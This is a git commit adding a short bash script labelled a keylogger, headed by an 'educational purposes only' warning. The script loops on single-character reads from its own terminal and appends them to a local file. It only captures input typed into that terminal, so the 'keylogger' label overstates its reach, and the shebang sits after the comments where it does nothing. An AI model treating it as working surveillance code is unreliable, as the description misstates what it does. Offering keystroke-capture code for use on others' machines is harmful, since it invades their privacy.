d70b2d0b6f20e390781f26cadc05d0a6964f7c49
stevenbertolucci <steven.bertolucci@yahoo.com>
2024-03-09 21:18:19 -0800

    keylogger in shell script

---
+++ keylogger.sh
@@ -0,0 +1,37 @@
+# **************************************************
+# *	    FOR EDUCATIONAL PURPOSES ONLY!	   *
+# *						   *
+# * 	BY DOWNLOADING AND RUNNING THIS SCRIPT     *
+# * 	YOU ACKNOWLEDGE THAT THIS WILL BE USED     *
+# * 	 FOR EDUCATIONAL PURPOSES AND USED ON      *
+# * 	MACHINES THAT GRANTS YOU PERMISSION TO     *
+# * 		  TEST THIS PROGRAM. 	           *
+# *    					           *
+# * 	IF YOU RUN THIS PROGRAM ON UNAUTHORIZED    *
+# *      MACHINES WITHOUT THEIR CONSENT, IT IS     *
+# *     UNETHICAL AND ILLEGAL. BY READING THIS,    *
+# *             YOU HAVE BEEN WARNED. 	           *
+# **************************************************
+
+#!/bin/bash
+
+# File to store the keylogs
+log_file="keystrokes.txt"
+
+# Function to log the keypresses
+log_keys() {
+    # Log the keypresses to the file
+    while true; do
+        read -n1 key
+        echo -n "$key" >> "$log_file"
+    done
+}
+
+# Check if the log file exists, if not, create it
+if [ ! -f "$log_file" ]; then
+    # Create an empty file using echo command
+    touch "$log_file"
+fi
+
+# Start logging the keys
+log_keys
